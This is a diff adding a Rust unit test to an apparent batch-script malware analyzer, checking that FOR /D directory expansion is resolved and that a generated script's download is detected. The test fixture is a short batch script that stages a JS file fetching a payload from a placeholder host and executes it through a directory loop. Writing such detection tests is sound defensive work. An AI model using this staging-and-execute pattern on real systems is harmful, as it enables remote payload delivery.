@@ -15454,6 +15454,34 @@ for /F "eol=# tokens=* delims=" %%A in (config.ini) do echo got=%%A
 }
 
 #[cfg(test)]
+mod for_d_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn for_d_wildcard_over_tracked_directory_feeds_later_script_execution() {
+        let script = br#"mkdir C:\Temp\Stage
+echo fetch('https://for-d-dir.example/payload') > C:\Temp\Stage\run.js
+for /D %%D in (C:\Temp\*) do call %%D\run.js"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(r#"call c:\temp\stage\run.js"#),
+            "FOR /D did not substitute tracked directory:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://for-d-dir.example/payload")
+            }),
+            "FOR /D directory execution did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+}
+
+#[cfg(test)]
 mod synth_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::synth::run_pipeline;
